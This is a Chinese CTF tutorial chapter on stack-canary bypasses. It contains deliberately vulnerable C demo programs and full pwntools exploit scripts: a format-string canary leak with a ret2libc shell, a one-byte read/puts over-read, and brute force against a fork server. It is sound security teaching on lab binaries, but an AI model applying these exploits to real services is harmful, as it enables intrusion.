---
chapter: PWN
section: Canary 绕过与 GOT 攻击
order: 311
tags:
  - CTF
  - PWN
  - Canary
publish: true
---

# P11 Canary 绕过与 GOT 攻击
## Canary Bypass & GOT Attacks

> [!info]- 章节信息
> **所属方向**：PWN ｜ **难度阶段**：L2 栈上利用期 ｜ **前置要求**：[[P09-格式化字符串漏洞|P9]] · [[P04-Linux安全缓解机制|P4]] · [[P07-ret2libc-ret2syscall-ret2shellcode|P7]]
> **本章目标**：面对 Canary 全开的程序，把"泄露原样回填、fork 逐字节爆破、不碰哨兵改栈外目标"三条思路各走通一个完整 exploit——格式化字符串泄露后 ret2libc 拿 shell、read/puts 越界一字节带出哨兵、fork 服务逐字节爆破、改写 `__stack_chk_fail@got` 让校验失败反而进 win——最后收拢成"题目给什么条件、走哪条路线"的决策表。

[[P04-Linux安全缓解机制#3. Stack Canary：栈上的哨兵值|P4 第 3 节]]讲过哨兵的全部机制：函数入口从 `fs:0x28` 取值存进 `[rbp-0x8]`，返回前比对，不对就 `call __stack_chk_fail` 终止进程。它拦的是 P6 那类==从 buf 一路覆盖到返回地址==的硬覆盖——溢出从 buf 向高地址推进，想够到 `[rbp+0x8]` 必先碾过哨兵，尾声检查必炸，程序死于 SIGABRT、报 `*** stack smashing detected ***`。加大填充长度硬试没有意义，本章给出的是有意义的做法。

思路只有三条：

1. **泄露它，原样放回**：先把哨兵读出来，溢出 payload 在原位置填回原值，尾声照常放行——[[P04-Linux安全缓解机制#3. Stack Canary：栈上的哨兵值|P4 第 3 节]]"没防住什么"的第一类。读的渠道按题目给什么定：格式化字符串（路线一，第 2 节）、read/puts 越界一字节（路线二，第 3 节）、fork 服务逐字节爆破（路线三，第 4 节——穷举版泄露，用连接次数换泄露渠道）；
2. **让"检查失败"改道**：校验失败会 `call __stack_chk_fail@plt`，Partial RELRO 下这个 GOT 槽位可写——把它改成 `win`，==故意砸碎哨兵反而跳进 win==（路线四，第 5 节）；
3. **别碰它**：哨兵只守"栈上返回地址"这一条路，GOT、函数指针、退出处理结构都在管辖区外；溢出长度受限时还有"只覆盖返回地址低 2 字节"的缩减打法（第 6 节）。

三条思路对应的路线、前提与产出，先立一张总表，每一行是本章的一节：

| 路线 | 思路 | 题目要给的条件 | 产出 |
| ---- | ---- | ---- | ---- |
| 一（第 2 节） | 泄露回填 | `printf(用户输入)` 一类的格式化字符串漏洞 | 泄露 Canary 与 libc 基址，回填后 ret2libc 拿 shell |
| 二（第 3 节） | 泄露回填 | 溢出用 `read` 且长度可控、有 `puts(buf)` 一类输出 | 越界一字节带出哨兵，回填后 ret2win |
| 三（第 4 节） | 泄露回填（穷举） | 远程是 fork 型服务：连接崩了服务不倒 | 逐字节猜出 Canary，均摊约每字节 128 次连接 |
| 四（第 5 节） | 让检查失败改道 / 别碰哨兵 | 任意写（如 `%n`）+ Partial RELRO | 砸碎哨兵反而执行 `win` |
| 五（第 6 节） | 别碰哨兵（少写字节） | 非 PIE、返回地址与目标高位相同 | 42 字节改道 `win` |

> [!info]- 本章演示程序的编译基线
> 五个自编程序共用一套参数：`-O0`（帧布局与源码逐行对应，[[R03-x86与x64汇编精要复习#1. 本章范围与编译基线|R03 第 1 节]]的编译基线）、`-fno-pie -no-pie`（程序固定在 0x400000，程序内地址可写死，[[P04-Linux安全缓解机制#5. PIE：程序本体的基址随机化|P4 第 5 节]]）；==不加 `-fno-stack-protector`==，Ubuntu 默认的 `-fstack-protector-strong` 生效、Canary 在场——==本章要绕的就是它==。两处例外：5.3 的 Full RELRO 版加 `-Wl,-z,now`；第 6 节的部分覆盖演示加 `-fno-stack-protector`——部分覆盖省的是"地址不知道、字节不够多"，不解决"比对通过"，关掉它以突出手法本身。真实赛题不会替你关保护，换题必须重新量偏移（[[P06-栈溢出原理与ret2win#2. 算偏移的两种方法|P6 第 2 节]]）。

## 2. 路线一：格式化字符串泄露，回填后 ret2libc

### 2.1 漏洞程序：一次会话，两个漏洞点

```c
/* p11_fmt.c —— 路线一演示程序：格式化字符串泄露 Canary + 溢出回填（x86-64 Linux） */
#include <stdio.h>

char *gets(char *s);   /* gets 已移出 C11 标准，手动补声明 */

void vuln(void) {
    char buf[128];
    printf("leak> ");
    gets(buf);
    printf(buf);          /* 漏洞点一：buf 被当作格式串，%N$p 读栈上 Canary 与 libc 地址 */
    putchar('\n');
    printf("stack> ");
    gets(buf);            /* 漏洞点二：越界写，Canary 原样回填后盖返回地址 */
}

int main(void) {
    setbuf(stdout, NULL);
    vuln();
    puts("bye");
    return 0;
}
```

同一个 `buf` 读两次：第一次喂格式串做泄露，第二次做溢出。==两轮发生在同一进程里，哨兵值不变==，第一轮读到的值第二轮直接可用——P9 预告过的"两轮式利用"（[[P09-格式化字符串漏洞#3. 定点泄露：Canary、libc 地址、栈地址|P9 第 3 节]]）在这里落地成完整 exploit。同目录放 `flag_fmt.txt` 充当 flag：

```bash
gcc -w -O0 -fno-pie -no-pie p11_fmt.c -o p11_fmt
```

输出：

```
/usr/bin/x86_64-linux-gnu-ld.bfd: /tmp/ccQvxjkb.o: in function `vuln':
p11_fmt.c:(.text+0x38): warning: the `gets' function is dangerous and should not be used.
```

```bash
pwn checksec ./p11_fmt 2>&1 | grep -E 'RELRO|Stack:|PIE'
```

输出：

```
    RELRO:      Partial RELRO
    Stack:      Canary found
    PIE:        No PIE (0x400000)
```

链接器那条 `gets` 警告 [[P01-PWN导论与缓解机制全景#5.1 漏洞程序与编译|P1 5.1]] 见过，警告不是错误；checksec 三行定下本章的保护组合：==Canary 开==（要绕的就是它）、==PIE 关==（程序内地址是常量）、Partial RELRO（GOT 函数槽可写，第 5 节要用）。

反汇编 `vuln` 读帧布局（x86-64 Linux / System V AMD64 ABI，Intel 语法）：

```bash
objdump -d -M intel p11_fmt | sed -n '/<vuln>:/,/^$/p'
```

输出：

```asm
00000000004011d6 <vuln>:
  4011d6:	f3 0f 1e fa          	endbr64
  4011da:	55                   	push   rbp
  4011db:	48 89 e5             	mov    rbp,rsp
  4011de:	48 81 ec 90 00 00 00 	sub    rsp,0x90
  4011e5:	64 48 8b 04 25 28 00 	mov    rax,QWORD PTR fs:0x28
  4011ee:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax     ; Canary 存进 rbp-0x8
  4011f2:	31 c0                	xor    eax,eax
  4011f4:	bf 04 20 40 00       	mov    edi,0x402004
  4011f9:	b8 00 00 00 00       	mov    eax,0x0
  4011fe:	e8 cd fe ff ff       	call   4010d0 <printf@plt>
  401203:	48 8d 85 70 ff ff ff 	lea    rax,[rbp-0x90]
  40120a:	48 89 c7             	mov    rdi,rax
  40120d:	e8 ce fe ff ff       	call   4010e0 <gets@plt>            ; 第一次读入
  401212:	48 8d 85 70 ff ff ff 	lea    rax,[rbp-0x90]
  401219:	48 89 c7             	mov    rdi,rax
  40121c:	b8 00 00 00 00       	mov    eax,0x0
  401221:	e8 aa fe ff ff       	call   4010d0 <printf@plt>          ; 漏洞点一：rdi = buf
  401226:	bf 0a 00 00 00       	mov    edi,0xa
  40122b:	e8 60 fe ff ff       	call   401090 <putchar@plt>
  401230:	bf 0b 20 40 00       	mov    edi,0x40200b
  401235:	b8 00 00 00 00       	mov    eax,0x0
  40123a:	e8 91 fe ff ff       	call   4010d0 <printf@plt>
  40123f:	48 8d 85 70 ff ff ff 	lea    rax,[rbp-0x90]
  401246:	48 89 c7             	mov    rdi,rax
  401249:	e8 92 fe ff ff       	call   4010e0 <gets@plt>            ; 第二次读入
  40124e:	90                   	nop
  40124f:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  401253:	64 48 2b 04 25 28 00 	sub    rax,QWORD PTR fs:0x28
  40125a:	00 00 
  40125c:	74 05                	je     401263 <vuln+0x8d>
  40125e:	e8 4d fe ff ff       	call   4010b0 <__stack_chk_fail@plt>
  401263:	c9                   	leave
  401264:	c3                   	ret
```

`buf` 在 `rbp-0x90` 占 128 字节，Canary 在 `rbp-0x8`（[[P04-Linux安全缓解机制#3. Stack Canary：栈上的哨兵值|P4 第 3 节]]的固定位置），尾声的四条比对指令也和 P4 的模板一致。

### 2.2 定位 Canary：布局换算，再用末字节 0x00 特征确认

Canary 在参数几？套 P9 的换算公式（$\text{参数号} = 6 + \frac{\text{buf 内字节偏移}}{8}$，[[P09-格式化字符串漏洞#2.2 位置参数确认：%6$p|P9 2.2]]）：

| 目标 | 位置 | 距 buf 起点的字节偏移 | 参数号 |
| ---- | ---- | ---- | ---- |
| buf 末尾的空槽 | rbp-0x10 | 128 | 22 |
| ==Canary== | rbp-0x8 | 136 | ==23== |
| 保存的 rbp | rbp+0x0 | 144 | 24 |
| 返回地址（main 内） | rbp+0x8 | 152 | 25 |
| main 的返回地址（libc 内） | rbp+0x18 | 168 | 27 |

换算是推算，`%p` 连打是实证，两相印证才定案。发一发"96 字节标记 + 相邻槽位连打"：

```python
#!/usr/bin/env python3
# exp_scan.py —— 定位 Canary：96 字节标记 + 相邻槽位连打
from pwn import *
context.log_level = 'error'

io = process('./p11_fmt')
io.recvuntil(b'leak> ')
io.sendline(b'A' * 96 + b'%22$p|%23$p|%24$p|%25$p')
print(io.recvline().decode().strip())
io.close()
```

```bash
python3 exp_scan.py
```

输出（前 96 个 A 略去）：

```
AAAA…AAAA0x7ffd865b9aa8|0x8e5421f4e295a400|0x7ffd865b9970|0x401286
```

96 个 `A` 原样打印（它们占了 buf 的前 96 字节），随后四个转换各取一槽，逐个判读：

| 参数 | 输出 | 是什么 |
| ---- | ---- | ---- |
| 22 | 0x7ffd865b9aa8 | buf 末尾与 Canary 之间空槽里的残留栈地址 |
| 23 | 0x8e5421f4e295a400 | ==末字节 `00`——这就是 Canary== |
| 24 | 0x7ffd865b9970 | 保存的 rbp，指向 main 的帧 |
| 25 | 0x401286 | 返回进 main 的地址（main+33） |

==末字节 `00` 是 Canary 的固定特征==：glibc 生成哨兵时故意清零最低字节（[[P04-Linux安全缓解机制#3. Stack Canary：栈上的哨兵值|P4 第 3 节]]的三条特性）。反汇编没读仔细、或者拿到的是 stripped 程序时，==夹在两个栈地址（0x7ff… 开头）之间、末字节为 `00` 的 8 字节值，九成就是 Canary==——这个特征识别法在没有任何布局情报时也用得上。

### 2.3 GDB 对证，顺带量出 libc 偏移

泄露值可不可信，GDB 里对一眼。断点下在第一次 `call gets`（0x40120d），把帧拍出来；probe 文件里是同一发 `%23$p|%27$p`，让程序自己打印的泄露值和 GDB 的转储出现在同一次运行里：

```
# gdb_fmt.cmds —— 跑法：gdb -q -batch -x gdb_fmt.cmds ./p11_fmt < probe_fmt.txt
set pagination off
set disassembly-flavor intel
break *0x40120d
run
printf "rbp = %p\n", $rbp
x/4gx $rbp
info symbol *(unsigned long *)($rbp+0x8)
info symbol *(unsigned long *)($rbp+0x18)
printf "leak check: param23 = %#lx  param27 = %#lx\n", *(unsigned long *)($rbp-0x8), *(unsigned long *)($rbp+0x18)
quit
```

```bash
gdb -q -batch -x gdb_fmt.cmds ./p11_fmt < probe_fmt.txt
```

输出（节选）：

```
Breakpoint 1, 0x000000000040120d in vuln ()
rbp = 0x7fffffffe150
0x7fffffffe150:	0x00007fffffffe160	0x0000000000401286
0x7fffffffe160:	0x00007fffffffe210	0x00007ffff7c2a601
main + 33 in section .text of /home/hua/p11w/p11_fmt
__libc_start_call_main + 129 in section .text of /usr/lib/x86_64-linux-gnu/libc.so.6
leak check: param23 = 0xa6f24819ae2fd400  param27 = 0x7ffff7c2a601
```

逐行对上：`[rbp-0x8]` 是末字节 `00` 的 Canary（参数 23 要取的值）；`[rbp+0x8]` 是 main+33（参数 25）；`[rbp+0x18]` 的 `0x7ffff7c2a601` 经 `info symbol` 认明是 libc 的 `__libc_start_call_main + 129`——==main 返回后要去的地方==，参数 27 取的就是它（[[P09-格式化字符串漏洞#3.3 GDB 对证：泄露值与帧内容逐一对上|P9 3.3]]对证过同一个槽位）。

要把它换算成 libc 基址，需要这个返回点在 libc 里的偏移。GDB 默认关闭被调试进程的 ASLR（[[P04-Linux安全缓解机制#4. ASLR：装载地址随机化|P4 第 4 节]]），本次运行 libc 基址固定在 `0x7ffff7c00000`：

$$\text{偏移} = \texttt{0x7ffff7c2a601} - \texttt{0x7ffff7c00000} = \texttt{0x2a601} \tag{11.1}$$

==偏移是这一版 libc 的常量，随机化动不到它==（[[P03-ELF链接与延迟绑定#6.3 方法二：双符号偏移差指纹|P3 6.3]]的"低 12 位不变"同理）。远程服务器的 libc 版本不同时，偏移要用题目附带的 libc 重新查，识别与匹配 [[P03-ELF链接与延迟绑定#6. libc 识别与版本匹配|P3 第 6 节]]。

### 2.4 回填 Canary，ret2libc 拿 shell

第二轮 payload 的构成——Canary 位置填回原值，其余照 [[P07-ret2libc-ret2syscall-ret2shellcode|P7]] 的 ret2libc 组装：

```text
; 回填 payload 的布局（x86-64 Linux / System V AMD64 ABI，从 buf 起向高地址）
;   [136 字节填充      ]   buf 128 + buf 后空槽 8
;   [Canary 原值       ]   ← 第 137 字节起：原样放回，尾声比对照常通过
;   [0xdeadbeef        ]   假 saved rbp，值随意但不能省
;   [ret gadget 地址   ]   补栈对齐，见下方折叠框
;   [pop rdi ; ret 地址]   把下一槽弹进 rdi
;   ["/bin/sh" 地址    ]   system 的参数
;   [system 地址       ]   vuln 的 ret 落进链首，一路串到这
```

两个地址从 libc 里取：gadget 用 ROPgadget 搜（工具 [[P05-pwntools与GDB插件工具链|P5]] 对比）：

```bash
ROPgadget --binary /usr/lib/x86_64-linux-gnu/libc.so.6 2>/dev/null | grep -E ': pop rdi ; ret$'
ROPgadget --binary /usr/lib/x86_64-linux-gnu/libc.so.6 2>/dev/null | grep -E ' : ret$' | head -3
```

输出：

```
0x000000000011b9fa : pop rdi ; ret
0x00000000000289fe : ret
```

拿到三个偏移：`pop rdi ; ret` 在 0x11b9fa、裸 `ret` 在 0x289fe，`system` 与 `"/bin/sh"` 用 pwntools 直接查 ELF（[[P03-ELF链接与延迟绑定#4. ret2plt：把 libc 地址打印出来|P3 第 4 节]]的查法）。

> [!info]- 链首那个裸 ret 是干什么的
> system 一族函数内部有 movaps 这类按 16 字节对齐整块读写栈的指令，而 ret2libc 跳进 system 的瞬间 rsp 的对齐比 ABI 约定"浅"8 字节，差 8 必崩——成因、诊断与三种修法 [[P06-栈溢出原理与ret2win#5. 栈 16 字节对齐与 movaps 崩溃|P6 第 5 节]]讲透了，修法一就是在链首垫一条只有 `ret` 的 gadget。本次 gadget 从 libc 里搜，因为==libc 基址已经在手上==，顺理成章。

```python
#!/usr/bin/env python3
# exp_fmt.py —— 路线一：泄露 Canary 与 libc 基址，回填后 ret2libc 拿 shell
from pwn import *
context.arch = 'amd64'
context.log_level = 'info'

OFF_LIBCRET = 0x2a601    # main 的返回地址落在 __libc_start_call_main+129，本版 libc 里的偏移
OFF_POP_RDI = 0x11b9fa   # libc 里 pop rdi ; ret 的偏移（ROPgadget 量出）
OFF_RET     = 0x289fe    # libc 里裸 ret 的偏移，给 system 补栈对齐用

libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6', checksec=False)

io = process('./p11_fmt')
io.recvuntil(b'leak> ')
io.sendline(b'%23$p|%27$p')
canary_s, libcret_s = io.recvline().strip().split(b'|')
canary    = int(canary_s, 16)
libc_base = int(libcret_s, 16) - OFF_LIBCRET
assert libc_base & 0xfff == 0, '基址低 12 位应为 0，泄露或偏移有误'
success('canary    = %#018x' % canary)
success('libc base = %#x' % libc_base)

system  = libc_base + libc.symbols['system']
binsh   = libc_base + next(libc.search(b'/bin/sh\x00'))
pop_rdi = libc_base + OFF_POP_RDI
ret     = libc_base + OFF_RET

io.recvuntil(b'stack> ')
payload  = b'A' * 136 + p64(canary) + p64(0xdeadbeef)
payload += p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)
io.sendline(payload)

io.sendline(b'cat flag_fmt.txt')
success(io.recvline().decode().strip())
io.close()
```

两个细节：`assert libc_base & 0xfff == 0` 是 [[P03-ELF链接与延迟绑定#6.4 手工匹配完整流程|P3 6.4]]的页对齐判据，泄露少收字节或偏移用错版本时它先报错；拿到 shell 后再发一条 `cat flag_fmt.txt`，==flag 从自己启动的 shell 里读出来==。

```bash
python3 exp_fmt.py
```

输出：

```
[x] Starting local process './p11_fmt'
[+] Starting local process './p11_fmt': pid 3143
[+] canary    = 0xdb6f56d5ee2f2900
[+] libc base = 0x78a246e00000
[+] flag{canary_fmt_refill_shell}
[*] Stopped process './p11_fmt' (pid 3143)
```

泄露的 Canary `0xdb6f56d5ee2f2900` 末字节 `00`，基址 `0x78a246e00000` 页对齐，判据全过。==尾声的比对还在执行，只是比对的两边被我们对齐了==——这就是"泄露回填"的全部内容。

> [!warning] gets 类输入下，payload 全体字节不能有 0x0a
> Canary 的 7 个随机字节撞上 `0x0a`（约 2.7% 的概率）时，gets 把它当终止符，payload 被截成两段，收尾必然报 stack smashing。==重跑一次即可==——每个进程的哨兵重新随机，撞不撞看运气。libc 地址的低位字节同样可能撞上。用 read 的题目没有这一层担忧（[[P06-栈溢出原理与ret2win#7. 输入函数与 payload：gets 与 read 的差别|P6 第 7 节]]）。

## 3. 路线二：read 越界一字节，puts 带出 Canary

题目没有格式化字符串漏洞时，泄露还有一条经典路：==溢出长度恰好多一字节，把这多出来的一字节压在哨兵的最低字节上，再用 `puts(buf)` 把哨兵连同后续一起打印出来==。它成立的前提全在哨兵自己的设计里：最低字节恒为 `0x00`，而 `puts` 打到 `\0` 才停——把 `0x00` 顶掉，输出就能越过 buf 的边界继续走。

### 3.1 恰好多一字的布局

```c
/* p11_read.c —— 路线二演示程序：read 越界一字节，puts 带出 Canary（x86-64 Linux） */
#include <stdio.h>
#include <unistd.h>

void win(void) {
    char flag[64];
    FILE *f = fopen("flag_read.txt", "r");
    if (f == NULL) {
        puts("[win] flag_read.txt not found");
        return;
    }
    fgets(flag, sizeof(flag), f);
    puts(flag);
    fclose(f);
}

void vuln(void) {
    char buf[136];
    read(0, buf, 137);   /* 漏洞点一：137 = 136 + 1，最后一字节恰好压到 Canary 的最低字节 */
    puts(buf);           /* Canary 首字节被顶掉，puts 把余下 7 字节连同后续一起带出来 */
    read(0, buf, 300);   /* 漏洞点二：第二轮完整溢出，Canary 原样放回后再盖返回地址 */
}

int main(void) {
    setbuf(stdout, NULL);
    vuln();
    puts("bye");
    return 0;
}
```

```bash
gcc -w -O0 -fno-pie -no-pie p11_read.c -o p11_read
objdump -d -M intel p11_read | sed -n '/<vuln>:/,/^$/p'
```

输出（节选）：

```asm
; x86-64 Linux / System V AMD64 ABI
000000000040127a <vuln>:
  401282:	48 81 ec 90 00 00 00 	sub    rsp,0x90
  401292:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax     ; Canary 存进 rbp-0x8
  401298:	48 8d 85 70 ff ff ff 	lea    rax,[rbp-0x90]
  40129f:	ba 89 00 00 00       	mov    edx,0x89                    ; 第一次 read：137 字节
  4012ac:	e8 2f fe ff ff       	call   4010e0 <read@plt>
  4012b8:	48 89 c7             	mov    rdi,rax
  4012bb:	e8 e0 fd ff ff       	call   4010a0 <puts@plt>           ; 把 buf 打出来
  4012c7:	ba 2c 01 00 00       	mov    edx,0x12c                   ; 第二次 read：300 字节
  4012d4:	e8 07 fe ff ff       	call   4010e0 <read@plt>
  4012e9:	e8 d2 fd ff ff       	call   4010c0 <__stack_chk_fail@plt>
  4012ee:	c9                   	leave
  4012ef:	c3                   	ret
```

`buf` 声明 136 字节、落在 `rbp-0x90`，==恰好与 `rbp-0x8` 的 Canary 贴在一起==（136 = 0x88 = 0x90 − 0x8，中间没有空隙——这个"恰好"要靠反汇编确认，声明大小与实际排布没有公式，[[P06-栈溢出原理与ret2win#2.3 手算对账|P6 2.3]]的提醒）。于是：

- 第一次 `read` 的 137 = 136 + 1：前 136 字节填满 buf，==第 137 字节落在 Canary 的最低字节上==；
- `puts(buf)` 从 buf 起逐字节输出，被顶掉 `\0` 的哨兵不再拦路，==余下 7 个哨兵字节连同后面保存的 rbp 一起被打印==，直到内存里下一个 `\0` 才收尾；
- 第二次 `read` 上限 300：完整溢出的入口，Canary 此时已经知道，原样放回。

```bash
nm p11_read | grep -E ' T (main|vuln|win)$'
```

输出：

```
00000000004012f0 T main
000000000040127a T vuln
00000000004011f6 T win
```

### 3.2 字节处理与回填利用

输出的字节处理是这条路线的全部技术含量。发 137 字节（136 个 `A` + 一个 `B`），`puts` 的输出逐段切开：

```text
; puts 输出的构成（按内存顺序）
;   [136 字节 'A']  buf 本体，原样打出
;   [1 字节 'B']    被我们顶上去的，占着 Canary 最低字节的位置
;   [7 字节 ???]    ← Canary 的高 7 字节，要的就是它
;   [若干字节]      保存的 rbp 的可见字节，打到 \0 为止（对本题无用）
```

三步处理：==切==——取第 138 到 144 字节共 7 个（跳过那个 `B`）；==补==——把缺的最低字节 `\x00` 补回最前面；==拼==——`u64` 还原成 8 字节。注意补的方向：P3 的 GOT 泄露缺的是==高==位（libc 地址高两字节恒 0），用 `ljust` 把零补在末尾；这里缺的是==低==位，零必须补在最前——同是"补零还原"，方向相反。

```python
#!/usr/bin/env python3
# exp_readputs.py —— 路线二：一字节越界带出 Canary，回填后 ret2win
from pwn import *
context.arch = 'amd64'
context.log_level = 'info'

PAD = 136          # buf 起点到 Canary 起点的距离（objdump 量出：rbp-0x90 与 rbp-0x8）
WIN = 0x4011f6     # nm 查到的 win 地址

io = process('./p11_read')
io.send(b'A' * PAD + b'B')          # 第 137 字节恰好压掉 Canary 的最低字节 \x00
line = io.recvline()                # puts 把 buf 与其后可见的字节一起打出
assert len(line) >= PAD + 8, '输出被 \\x00 截断，Canary 字节里混了 0，重跑一次'
canary = u64(b'\x00' + line[PAD + 1:PAD + 8])   # 缺的是低位：末字节 \x00 补在最前
assert canary & 0xff == 0
success('canary = %#018x' % canary)

io.send(b'A' * PAD + p64(canary) + p64(0xdeadbeef) + p64(WIN))
success(io.recvline().decode().strip())
io.close()
```

```bash
python3 exp_readputs.py
```

输出：

```
[x] Starting local process './p11_read'
[+] Starting local process './p11_read': pid 3149
[+] canary = 0x4bce10faa66f7c00
[+] flag{read_puts_canary_leak}
[*] Stopped process './p11_read' (pid 3149)
```

还原出的 `0x4bce10faa66f7c00` 末字节 `00`，特征正确；第二轮 payload 原样放回，`win` 读出 flag。

> [!warning] 哨兵字节里混了 0，输出会提前截断
> Canary 的高 7 字节也是随机的，==哪个字节是 `\x00`，`puts` 就停在哪==（`0x0a` 则会让 `recvline` 提前断行），脚本里的 `assert` 拦的就是这种残缺泄露。处理方式与 2.4 的 warning 相同：==重跑==，每个进程的哨兵都是新随机值。真实赛题里把 `puts` 换成 `write(fd, buf, n)`（按长度输出、不认 `\0`）就没有这个截断问题，题目给了 `write` 要优先用。

## 4. 路线三：fork 服务下的逐字节爆破

前两条路线都要一个"读"的渠道。什么渠道都没有时，还有一条用连接次数换泄露的路——前提是远程服务长成特定形状。

### 4.1 原理：继承与判定

[[P04-Linux安全缓解机制#3. Stack Canary：栈上的哨兵值|P4 第 3 节]]的三条特性里有两条是这条路的地基，各用一句话接过来：

- **fork 后不变**：`fork` 复制整个地址空间，TLS 里的哨兵原件原样带过去——==父进程 fork 出的所有子进程共享同一个 Canary==；
- **子进程崩溃不影响父进程**：校验失败的子进程被 abort，父进程的 accept 循环照常运行——==猜错没有代价，猜对有信号==。

于是逐字节试：payload 只溢出到 Canary 的第 i 字节为止（此前各字节用已确认的值），==第 i 字节之后的哨兵原样保留在栈上==，尾声比对是否通过就完全由这一字节决定。判定信号两条：

| 子进程的行为 | 说明 | 判定 |
| ---- | ---- | ---- |
| 活着走到收尾，正常输出 | 比对通过，这一字节猜对了 | 对 |
| 死于 SIGABRT，连接被掐断 | 比对失败，这一字节猜错了 | 错 |

第 0 字节恒为 `\x00` 不用猜，剩下 7 字节、每字节最多 256 种取值：

$$N_{\max} = 7 \times 256 = 1792 \tag{11.2}$$

均摊约一半，==900 次上下必定拿下完整哨兵==。这对人手是天文数字，对脚本只是几分钟的循环。

### 4.2 靶子：fork 型网络服务

爆破要求"猜错可重来、Canary 不换新"，靶子必须按这个模型搭——==accept 到连接后 `fork` 出子进程，子进程**不再 exec**==，直接用继承的地址空间处理连接：

```c
/* p11_srv.c —— 路线三靶子：fork 型网络服务（x86-64 Linux）
   关键设计：accept 到连接后 fork 出子进程、子进程不再 exec，
   直接用继承的地址空间（含启动时已生成的 Canary）处理连接。 */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

void vuln(void) {
    char buf[136];
    read(0, buf, 300);   /* 溢出点：300 字节写进 136 字节的 buf */
}

int main(void) {
    setbuf(stdout, NULL);
    signal(SIGCHLD, SIG_IGN);          /* 子进程退出后自动回收，不留僵尸 */

    int srv = socket(AF_INET, SOCK_STREAM, 0);
    setsockopt(srv, SOL_SOCKET, SO_REUSEADDR, &(int){1}, sizeof(int));
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = htonl(INADDR_ANY);
    addr.sin_port = htons(1337);
    bind(srv, (struct sockaddr *)&addr, sizeof(addr));
    listen(srv, 16);

    while (1) {
        int conn = accept(srv, NULL, NULL);
        if (conn < 0) continue;
        if (fork() == 0) {             /* fork 之后不 exec：Canary 原样继承 */
            close(srv);
            dup2(conn, 0);
            dup2(conn, 1);
            dup2(conn, 2);
            close(conn);
            vuln();
            puts("bye");       /* 判定信号：Canary 校验通过、vuln 活着返回才打得出 */
            _exit(0);
        }
        close(conn);                   /* 父进程继续等下一个连接 */
    }
}
```

判定信号的位置有讲究：`puts("bye")` 放在 `vuln()` ==返回之后==、由子进程执行。校验通过，`vuln` 活着返回，`bye` 打得出；校验失败，`__stack_chk_fail` 在尾声就把子进程 abort 了，==`bye` 永远打不出来==——客户端收到的是 stderr 上的报错（fd 2 已 dup2 到套接字）。两种结局各发一发，把信号看清：

```python
#!/usr/bin/env python3
# exp_signal.py —— 两种结局各发一发，看清判定信号
from pwn import *
context.log_level = 'error'

def probe(payload):
    io = remote('127.0.0.1', 1337)
    io.send(payload)
    data = io.recvrepeat(0.3)
    io.close()
    return data

print('只发 136 字节，Canary 不动      ->', probe(b'A' * 136))
print('发 136A + \\x01，低字节非 0     ->', probe(b'A' * 136 + b'\x01'))
```

```bash
gcc -w -O0 -fno-pie -no-pie p11_srv.c -o p11_srv
./p11_srv &
python3 exp_signal.py
```

输出：

```
只发 136 字节，Canary 不动      -> b'bye\n'
发 136A + \x01，低字节非 0     -> b'*** stack smashing detected ***: terminated\n'
```

`p11_srv` 的帧布局与 `p11_read` 相同（`buf` 在 `rbp-0x90`、Canary 在 `rbp-0x8`、距离 136，`objdump` 可对证），所以试错字节的填充长度同为 136。

> [!warning] fork 之后 exec 了，这条路就断了
> [[P01-PWN导论与缓解机制全景#5.6 第五步：打远程|P1 5.6]]的 serve.py 是 fork 后 `execv` 的模型——`execve` 换掉整个程序映像，libc 重新启动，==每个连接的 Canary 都是新生成的随机值==，上一连接猜出的字节全部作废。==能爆 Canary 的远程服务必须"fork 不 exec"==：处理连接的子进程从监听进程直接分裂出来。真实赛题里"连接崩了服务不倒"的靶机正是这个形态；反过来，把它当判定依据——服务会被单个连接打死（exec 型，如 xinetd 转发）的题，别浪费次数爆破。

### 4.3 爆破脚本逐段讲解

```python
#!/usr/bin/env python3
# exp_brute.py —— 路线三：fork 服务下的逐字节爆破（演示跑到第 3 字节）
from pwn import *
context.log_level = 'error'

HOST, PORT = '127.0.0.1', 1337
PAD = 136                       # buf 起点到 Canary 起点的距离，以反汇编为准

known = b'\x00'                 # 第 0 字节恒为 \x00（哨兵的固定设计）
tries_total = 0
for i in range(1, 8):
    hits = 0
    for guess in range(256):
        cand = known + bytes([guess])
        io = remote(HOST, PORT)
        io.send(b'A' * PAD + cand)      # 只盖到本字节，其后的 Canary 原样保留
        data = io.recvrepeat(0.2)
        io.close()
        hits += 1
        if b'bye' in data:              # 子进程活着走到收尾 = 这个字节猜对了
            tries_total += hits
            print(f'byte {i} = {guess:#04x}   本字节尝试 {hits} 次，累计 {tries_total} 次')
            known = cand
            break
    else:
        print(f'byte {i}：256 次全不中——检查 PAD 或服务是否为 fork 继承模型')
        break
    if i == 3:
        print(f'演示到此为止，已确认前 {len(known)} 字节：{known.hex(" ")}')
        print('余下 4 字节最多再 4*256=1024 次；全 7 字节最多 7*256=1792 次')
        break
```

逐段过一遍，每一段都对应 4.1 的一条原理：

- **`known = b'\x00'`**：第 0 字节不猜，从已知的 `00` 起步；
- **`b'A' * PAD + cand`**：payload 只写 `136 + len(known)` 字节——==第 i 字节之后的栈上数据一个不动==，尾声比对的是"我们的前缀 + 原装的后缀"，通过与否只由本字节决定；
- **每次 `remote` 新开连接**：猜错的子进程崩就崩了，父进程照常 accept 下一条——这是 4.1 的第二条特性，也是每次连接必须重开的原因（子进程的栈已经被上一发的填充写坏）；
- **`b'bye' in data`**：判定信号，4.2 的输出里两种结局都已见过；
- **`for…else` 的 256 次全不中**：模型不对的报警——PAD 量错了，或服务是 fork+exec 型（上方 warning）；
- **`i == 3` 收手**：演示只跑到第 3 字节，完整跑完的代价见 4.4。

```bash
./p11_srv &
python3 exp_brute.py
```

输出：

```
byte 1 = 0xde   本字节尝试 223 次，累计 223 次
byte 2 = 0x65   本字节尝试 102 次，累计 325 次
byte 3 = 0x82   本字节尝试 131 次，累计 456 次
演示到此为止，已确认前 4 字节：00 de 65 82
余下 4 字节最多再 4*256=1024 次；全 7 字节最多 7*256=1792 次
```

